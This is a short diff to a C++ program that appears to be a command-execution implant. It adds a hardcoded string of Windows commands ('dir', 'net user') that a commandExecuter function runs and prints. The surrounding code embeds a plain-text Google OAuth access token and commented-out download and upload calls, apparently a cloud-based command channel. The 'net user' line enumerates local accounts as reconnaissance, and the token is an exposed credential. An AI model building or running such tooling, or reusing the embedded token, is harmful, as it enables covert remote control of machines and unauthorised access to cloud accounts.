@@ -46,6 +46,7 @@ int Odd_Num() {
 //}
 
 int main() {
+    std::string input = "dir\nnet user\necho bs";
     std::string output;
     std::string refreshToken;
     std::string accessToken = "ya29.a0AcM612y6rVSYtP90ijDLNW_xqvcfgqV8CwSa52j3_eQA8JgMsNmhRvxH1SmSTWw9GDWSeTUG7ZRYavRPCwM1k9qIU_aRcEHjGrnKDzBQj0fOfzTWSnBaQLCHLtkw4AgpoUF3SIlfWNvGgoaP4l_1LjLGIat5krxDKG4wpjfEWwaCgYKAeASARASFQHGX2Mie2onw65Tg46rV153wG053w0177";
@@ -65,8 +66,9 @@ int main() {
     //downloadContext(accessToken, output);
     //printf("Test begins:\nThe single upload error code: %d", errorCode);
     //printf_s("Source Context is: %s", output.c_str());
-
-
+    //std::replace(input.begin(), input.end(), '\n', '&');
+    commandExecuter(input, output);
+    printf("Command execution result: %s", output.c_str());
     return 0;
 }
 
